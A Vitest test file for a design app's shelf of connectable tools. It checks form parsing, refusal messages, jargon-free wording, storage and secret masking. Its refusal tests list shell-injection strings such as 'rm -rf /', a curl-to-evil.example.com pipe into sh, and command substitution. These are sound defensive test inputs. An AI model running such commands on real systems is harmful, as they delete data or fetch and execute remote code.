/** What Graphe can reach.
 *
 * Three things are protected here. That nothing anybody types — or edits into
 * the file afterwards — can become a program with a shell in it. That every
 * refusal comes back as a sentence somebody can act on rather than as a throw.
 * And that none of the words on this screen name a mechanism: the whole point
 * of this shelf is that it says what a thing lets you do.
 *
 * Nothing here touches a disk, an address or a process: the shelf is handed a
 * fake store and the rest is pure.
 */

import { readFileSync } from 'node:fs';
import { describe, expect, it, vi } from 'vitest';

import {
  REACHABLE,
  SAID,
  describeStart,
  readReach,
  readStored,
  readValues,
  reachShelf,
  reachesMatching,
  toKept,
  whereOf,
  withAdded,
  type Kept,
  type Reach,
  type ReachStore,
} from '../src/agent/pi/reach';
import { everything, type Pack } from '../src/agent/pi/packages';

const A_PACK: Pack = {
  id: 'pi-lens',
  name: 'Lens',
  kind: 'mixed',
  summary: 'Something.',
  downloads: 3,
  version: '1.0.0',
  installed: false,
  curated: true,
};

function reachOf(typed: unknown, already: readonly Reach[] = []): Reach {
  const read = readReach(typed, already);
  if (!read.ok) throw new Error(`expected a reach, got: ${read.why}`);
  return read.reach;
}

function whyNot(typed: unknown, already: readonly Reach[] = []): string {
  const read = readReach(typed, already);
  if (read.ok) throw new Error(`expected a refusal, got: ${read.reach.id}`);
  return read.why;
}

/* ========================================================================== */
/* R-01 the ones we vouch for                                                  */
/* ========================================================================== */

describe('the curated shelf', () => {
  it('offers the tools a designer already has open', () => {
    expect(REACHABLE.map((one) => one.id)).toEqual(['figma', 'pencil', 'browser']);
  });

  it('says what each one lets you do, in one sentence, and never what it is', () => {
    for (const one of REACHABLE) {
      expect(one.name.length).toBeGreaterThan(0);
      expect(one.what.length).toBeGreaterThan(40);
      expect(one.what.endsWith('.')).toBe(true);
      expect(one.what.replace(/\.$/, '')).not.toMatch(/\.\s/);
      expect(one.what.toLowerCase()).toMatch(/^lets me /);
    }
  });

  it('is off, every one of it, until somebody presses something', () => {
    expect(REACHABLE.every((one) => !one.added)).toBe(true);
    expect(REACHABLE.every((one) => one.curated)).toBe(true);
  });

  it('carries a start we would accept from the form ourselves', () => {
    for (const one of REACHABLE) {
      const again = reachOf({ name: one.name, where: whereOf(one.start) });
      expect(again.start).toEqual(one.start);
    }
  });

  it('names each of them once', () => {
    expect(new Set(REACHABLE.map((one) => one.id)).size).toBe(REACHABLE.length);
    expect(new Set(REACHABLE.map((one) => one.name.toLowerCase())).size).toBe(REACHABLE.length);
  });
});

/* ========================================================================== */
/* R-02 what somebody types                                                    */
/* ========================================================================== */

describe('reading a filled-in form', () => {
  it('takes an address somebody pasted', () => {
    expect(reachOf({ name: 'Our notes', where: 'https://notes.example.com/x' })).toEqual({
      id: 'yours:our-notes',
      name: 'Our notes',
      what: SAID.yourOwn,
      needs: null,
      start: { how: 'address', address: 'https://notes.example.com/x' },
      curated: false,
      added: true,
    });
  });

  it('takes a program and the words after it', () => {
    const reach = reachOf({
      name: 'My thing',
      what: 'Lets me read the files I keep elsewhere.',
      where: 'npx -y some-thing@1.2.3',
    });
    expect(reach.start).toEqual({
      how: 'program',
      command: 'npx',
      args: ['-y', 'some-thing@1.2.3'],
      values: {},
    });
    expect(reach.what).toBe('Lets me read the files I keep elsewhere.');
  });

  it('holds a quoted word together', () => {
    const reach = reachOf({ name: 'Spaced', where: '"/Applications/My App/run" --open "a b"' });
    expect(reach.start).toMatchObject({
      command: '/Applications/My App/run',
      args: ['--open', 'a b'],
    });
  });

  it('reads the values it was given, as lines or as a map', () => {
    const lines = reachOf({ name: 'A', where: 'run', values: '# a note\n\nONE=first\nTWO=second' });
    expect(lines.start).toMatchObject({ values: { ONE: 'first', TWO: 'second' } });

    const map = reachOf({ name: 'B', where: 'run', values: { ONE: 'first' } });
    expect(map.start).toMatchObject({ values: { ONE: 'first' } });
  });

  it('tidies a name typed with stray spaces, and keeps the id plain', () => {
    expect(reachOf({ name: '  Our   Design  System ', where: 'run' })).toMatchObject({
      name: 'Our Design System',
      id: 'yours:our-design-system',
    });
  });

  it('shortens a sentence too long to sit on a row', () => {
    const reach = reachOf({ name: 'A', where: 'run', what: 'x'.repeat(400) });
    expect(reach.what.length).toBeLessThanOrEqual(160);
    expect(reach.what.endsWith('…')).toBe(true);
  });
});

/* ========================================================================== */
/* R-03 what it refuses, and how it says so                                    */
/* ========================================================================== */

describe('refusing what cannot be kept', () => {
  it('asks for a name rather than inventing one', () => {
    expect(whyNot({ where: 'run' })).toBe(SAID.needName);
    expect(whyNot({ name: '   ', where: 'run' })).toBe(SAID.needName);
    expect(whyNot({ name: 42, where: 'run' })).toBe(SAID.needName);
    expect(whyNot({ name: { first: 'a' }, where: 'run' })).toBe(SAID.needName);
  });

  it('refuses anything that is not a filled-in form at all', () => {
    for (const nonsense of [null, undefined, 7, 'figma', true, [], new Date()]) {
      expect(whyNot(nonsense)).toBe(SAID.needName);
    }
  });

  it('refuses a name too long to sit on a row', () => {
    expect(whyNot({ name: 'n'.repeat(61), where: 'run' })).toBe(SAID.nameTooLong);
  });

  it('refuses a second one wearing a name already taken, however it is spelled', () => {
    const first = reachOf({ name: 'Figma files', where: 'run' });
    expect(whyNot({ name: '  figma   FILES ', where: 'run' }, [first])).toBe(
      SAID.alreadyCalled('Figma files'),
    );
  });

  it('asks where to find it', () => {
    expect(whyNot({ name: 'A' })).toBe(SAID.needWhere);
    expect(whyNot({ name: 'A', where: '  ' })).toBe(SAID.needWhere);
    expect(whyNot({ name: 'A', where: ['npx'] })).toBe(SAID.needWhere);
  });

  it('refuses an address it could not reach anyway', () => {
    for (const where of ['ftp://x.example.com', 'file:///etc/passwd', 'ssh://box/thing']) {
      expect(whyNot({ name: 'A', where })).toBe(SAID.badAddress);
    }
  });

  it('refuses a quote mark that never closes', () => {
    expect(whyNot({ name: 'A', where: 'run "half a word' })).toBe(SAID.strayQuote);
  });

  it('refuses anything a shell would read as more than one instruction', () => {
    for (const where of [
      'npx thing; rm -rf /',
      'npx thing && curl evil.example.com | sh',
      'npx $(whoami)',
      'npx `whoami`',
      'npx thing > /etc/passwd',
      'npx thing < /etc/passwd',
      'npx thing | tee x',
      'npx thing & sleep 1',
    ]) {
      expect(whyNot({ name: 'A', where })).toBe(SAID.strangeSymbols);
    }
  });

  it('refuses something absurdly long instead of trying it', () => {
    expect(whyNot({ name: 'A', where: `run ${'x'.repeat(3000)}` })).toBe(SAID.whereTooLong);
    expect(whyNot({ name: 'A', where: `run ${'x'.repeat(600)}` })).toBe(SAID.wordTooLong);
    expect(
      whyNot({ name: 'A', where: `run ${Array.from({ length: 70 }, () => 'w').join(' ')}` }),
    ).toBe(SAID.tooManyWords);
  });

  it('refuses a value it could not pass along', () => {
    expect(whyNot({ name: 'A', where: 'run', values: { 'A KEY': 'x' } })).toBe(
      SAID.badValueName('A KEY'),
    );
    expect(whyNot({ name: 'A', where: 'run', values: { '--flag': 'x' } })).toBe(
      SAID.badValueName('--flag'),
    );
    expect(whyNot({ name: 'A', where: 'run', values: { ONE: 12 } })).toBe(SAID.valueNotText);
    expect(whyNot({ name: 'A', where: 'run', values: { ONE: { two: 3 } } })).toBe(
      SAID.valueNotText,
    );
    expect(whyNot({ name: 'A', where: 'run', values: 7 })).toBe(SAID.valueNotText);
    expect(whyNot({ name: 'A', where: 'run', values: 'no equals sign here' })).toBe(
      SAID.badValueName('no equals sign here'),
    );
    expect(whyNot({ name: 'A', where: 'run', values: { ONE: 'x'.repeat(5000) } })).toBe(
      SAID.valueTooLong,
    );
    const many = Object.fromEntries(
      Array.from({ length: 40 }, (_, at) => [`V${at}`, 'x']),
    );
    expect(whyNot({ name: 'A', where: 'run', values: many })).toBe(SAID.tooManyValues);
  });

  it('never throws, whatever it is handed', () => {
    for (const nonsense of [
      null,
      { name: Symbol('a') },
      { name: 'A', where: 'run', values: [1, 2] },
      { name: 'A', where: 'run', values: null },
      { name: 'A', where: 'run', what: 99 },
      Object.create(null),
    ]) {
      expect(() => readReach(nonsense)).not.toThrow();
    }
  });
});

describe('every sentence it can say', () => {
  const sentences = Object.values(SAID)
    .map((said) => (typeof said === 'function' ? said('Something') : said))
    .filter((said) => said.length > 20);

  it('reads as a sentence a person could have written', () => {
    for (const said of sentences) {
      expect(said[0]).toBe(said[0]?.toUpperCase());
      expect(said).toMatch(/\.$/);
      expect(said).not.toMatch(/[!]|ERROR|failed|invalid/i);
    }
  });
});

/* ========================================================================== */
/* R-04 the words                                                              */
/* ========================================================================== */

/** Anything a designer would have to look up, or that names a mechanism rather
 *  than an outcome. None of it may reach the screen. */
const JARGON = [
  'mcp',
  'server',
  'stdio',
  'json',
  'config',
  'api',
  'protocol',
  'session',
  'token',
  'npm',
  'sdk',
  'cli',
  'plugin',
  'package',
  'registry',
  'binary',
  'runtime',
  'daemon',
  'endpoint',
  'shell',
  'spawn',
  'executable',
  'argument',
  'terminal',
  'localhost',
  'port',
  'variable',
  'git',
  'commit',
];

function noJargon(said: string, where: string): void {
  for (const word of JARGON) {
    const found = new RegExp(`\\b${word}(s|es)?\\b`).exec(said.toLowerCase());
    expect(found === null ? '' : `${where} says “${found[0]}”`).toBe('');
  }
}

describe('what any of this says out loud', () => {
  it('never names a mechanism in what we vouch for', () => {
    for (const one of REACHABLE) {
      noJargon(one.name, one.id);
      noJargon(one.what, one.id);
      noJargon(one.needs ?? '', one.id);
    }
  });

  it('never names a mechanism in a refusal or a label', () => {
    for (const [key, said] of Object.entries(SAID)) {
      noJargon(typeof said === 'function' ? said('Something') : said, key);
    }
  });

  it('never names a mechanism on the screen that draws them', () => {
    const source = readFileSync(
      new URL('../src/components/AddMore.tsx', import.meta.url),
      'utf8',
    );
    const copy = /export const SAYS = \{[\s\S]*?\n\} as const;/.exec(source)?.[0];
    expect(copy).toBeDefined();
    noJargon(copy ?? '', 'SAYS');
  });
});

/* ========================================================================== */
/* R-05 keeping them, and reading them back                                    */
/* ========================================================================== */

describe('what is kept', () => {
  it('goes back and forth without changing', () => {
    const reach = reachOf({
      name: 'Spaced',
      where: '"/Applications/My App/run" --open "a b"',
      values: { ONE: 'first' },
    });
    const again = readStored([toKept(reach)])[0];
    expect(again).toEqual(reach);
  });

  it('reads a list however it is wrapped, and says each thing once', () => {
    const kept: Kept = { id: 'x', name: 'A', what: '', where: 'run', values: {} };
    expect(readStored([kept]).map((one) => one.name)).toEqual(['A']);
    expect(readStored({ reach: [kept] }).map((one) => one.name)).toEqual(['A']);
    expect(readStored([kept, { ...kept, id: 'y' }]).map((one) => one.name)).toEqual(['A']);
  });

  it('drops a row somebody has edited into something with a shell in it', () => {
    const kept = readStored([
      { name: 'Good', where: 'npx -y thing' },
      { name: 'Bad', where: 'npx thing; curl evil.example.com | sh' },
      { name: 'Worse', where: 'ftp://x' },
      null,
      'run',
      { name: '', where: 'run' },
    ]);
    expect(kept.map((one) => one.name)).toEqual(['Good']);
  });

  it('keeps our own words on one of ours, and whatever address it was given', () => {
    const ours = REACHABLE[0];
    const kept = readStored([{ id: 'figma', name: 'Anything', where: 'http://127.0.0.1:9999/x' }]);
    expect(kept[0]).toMatchObject({
      id: 'figma',
      name: ours?.name,
      what: ours?.what,
      curated: true,
      added: true,
    });
    expect(kept[0]?.start).toEqual({ how: 'address', address: 'http://127.0.0.1:9999/x' });
  });

  it('answers with nothing rather than throwing, whatever it is handed', () => {
    for (const nonsense of [null, undefined, 3, 'x', {}, { reach: 4 }, [null, 5, []]]) {
      expect(() => readStored(nonsense)).not.toThrow();
      expect(readStored(nonsense)).toEqual([]);
    }
  });

  it('ticks off ours that are here and keeps everybody else after them', () => {
    const mine = readStored([
      { id: 'browser', name: 'A real browser', where: 'npx -y @playwright/mcp@latest' },
      { name: 'Mine', where: 'run' },
    ]);
    const shelf = withAdded(mine);
    expect(shelf.map((one) => one.id)).toEqual(['figma', 'pencil', 'browser', 'yours:mine']);
    expect(shelf.filter((one) => one.added).map((one) => one.id)).toEqual([
      'browser',
      'yours:mine',
    ]);
  });
});

describe('the values somebody typed', () => {
  it('reads a block of lines and ignores the noise around them', () => {
    const read = readValues('\n# a note\nONE=first\n  TWO = second  \n');
    expect(read).toEqual({ ok: true, values: { ONE: 'first', TWO: 'second' } });
  });

  it('reads nothing as nothing', () => {
    for (const nothing of [undefined, null, '']) {
      expect(readValues(nothing)).toEqual({ ok: true, values: {} });
    }
  });
});

/* ========================================================================== */
/* R-06 showing the real thing                                                 */
/* ========================================================================== */

describe('show me how it starts', () => {
  it('shows the address as it is', () => {
    expect(describeStart({ how: 'address', address: 'https://x.example.com/' })).toEqual([
      { label: SAID.labelAddress, value: 'https://x.example.com/' },
    ]);
  });

  it('shows the program and its words, exactly', () => {
    const reach = reachOf({ name: 'A', where: 'npx -y thing@1' });
    expect(describeStart(reach.start)).toEqual([
      { label: SAID.labelProgram, value: 'npx' },
      { label: SAID.labelWords, value: '-y thing@1' },
    ]);
  });

  it('names a private value but never prints it', () => {
    const reach = reachOf({
      name: 'A',
      where: 'run',
      values: { FIGMA_KEY: 'abc123', COLOUR: 'blue' },
    });
    const shown = describeStart(reach.start);
    expect(shown).toContainEqual({ label: 'FIGMA_KEY', value: SAID.hidden });
    expect(shown).toContainEqual({ label: 'COLOUR', value: 'blue' });
    expect(JSON.stringify(shown)).not.toContain('abc123');
  });
});

/* ========================================================================== */
/* R-07 both kinds on one shelf                                                */
/* ========================================================================== */

describe('the shelf both kinds sit on', () => {
  it('offers what it can reach first, then the additions', () => {
    const shelf = everything([A_PACK]);
    expect(shelf.map((one) => one.sort)).toEqual(['reach', 'reach', 'reach', 'addition']);
    expect(shelf.map((one) => one.id)).toEqual(['figma', 'pencil', 'browser', 'pi-lens']);
  });

  it('narrows to what somebody typed, on the sentence as well as the name', () => {
    expect(reachesMatching(REACHABLE, 'figma').map((one) => one.id)).toEqual(['figma']);
    expect(reachesMatching(REACHABLE, 'browser').map((one) => one.id)).toEqual(['browser']);
    expect(reachesMatching(REACHABLE, '  ')).toEqual(REACHABLE);
    expect(reachesMatching(REACHABLE, 'nothing like this')).toEqual([]);
  });
});

/* ========================================================================== */
/* R-08 the shelf itself                                                       */
/* ========================================================================== */

function fakeStore(overrides: Partial<ReachStore> = {}): ReachStore & { kept: Kept[] } {
  const store: ReachStore & { kept: Kept[] } = {
    kept: [],
    read: vi.fn((): Promise<unknown> => Promise.resolve(store.kept)),
    write: vi.fn((list: readonly Kept[]): Promise<void> => {
      store.kept = [...list];
      return Promise.resolve();
    }),
    ...overrides,
  };
  return store;
}

describe('turning one on', () => {
  it('adds nothing by itself: the list starts as ours, all of it off', async () => {
    const store = fakeStore();
    expect(await reachShelf(store).all()).toEqual(REACHABLE);
    expect(store.write).not.toHaveBeenCalled();
  });

  it('turns one of ours on when it is asked for by name', async () => {
    const store = fakeStore();
    const shelf = reachShelf(store);
    const done = await shelf.connect('figma');
    expect(done.ok).toBe(true);
    expect(store.kept.map((one) => one.id)).toEqual(['figma']);
    expect((await shelf.all()).find((one) => one.id === 'figma')?.added).toBe(true);
  });

  it('says plainly when it is asked for something it does not have', async () => {
    expect(await reachShelf(fakeStore()).connect('whatever')).toEqual({
      ok: false,
      why: SAID.nothingCalled,
    });
  });

  it('takes one somebody filled in themselves', async () => {
    const store = fakeStore();
    const done = await reachShelf(store).connect({ name: 'Mine', where: 'npx -y mine' });
    expect(done.ok).toBe(true);
    expect(store.kept[0]).toMatchObject({ id: 'yours:mine', where: 'npx -y mine' });
  });

  it('passes the refusal straight back, and keeps nothing', async () => {
    const store = fakeStore();
    expect(await reachShelf(store).connect({ name: 'Mine', where: 'npx a; rm -rf /' })).toEqual({
      ok: false,
      why: SAID.strangeSymbols,
    });
    expect(store.write).not.toHaveBeenCalled();
  });

  it('refuses a second one by the same name', async () => {
    const shelf = reachShelf(fakeStore());
    await shelf.connect({ name: 'Mine', where: 'run' });
    expect(await shelf.connect({ name: 'mine', where: 'run' })).toEqual({
      ok: false,
      why: SAID.alreadyCalled('Mine'),
    });
  });

  it('asking twice for the same one changes nothing', async () => {
    const store = fakeStore();
    const shelf = reachShelf(store);
    await shelf.connect('browser');
    expect(await shelf.connect('browser')).toMatchObject({ ok: true });
    expect(store.kept).toHaveLength(1);
  });

  it('turns one off again', async () => {
    const store = fakeStore();
    const shelf = reachShelf(store);
    await shelf.connect('figma');
    await shelf.disconnect('  figma  ');
    expect(store.kept).toEqual([]);
  });

  it('turns a failure to read into a sentence', async () => {
    const store = fakeStore({
      read: async () => {
        throw new Error('EACCES: permission denied');
      },
    });
    await expect(reachShelf(store).all()).rejects.toThrow(SAID.couldNotRead);
    expect(await reachShelf(store).connect('figma')).toEqual({
      ok: false,
      why: SAID.couldNotRead,
    });
  });

  it('turns a failure to keep it into a sentence', async () => {
    const store = fakeStore({
      write: async () => {
        throw new Error('ENOSPC');
      },
    });
    expect(await reachShelf(store).connect('figma')).toEqual({
      ok: false,
      why: SAID.couldNotKeep,
    });
  });

  it('does not throw at somebody when taking one off fails', async () => {
    const store = fakeStore({
      write: async () => {
        throw new Error('nope');
      },
    });
    await expect(reachShelf(store).disconnect('figma')).resolves.toBeUndefined();
  });
});
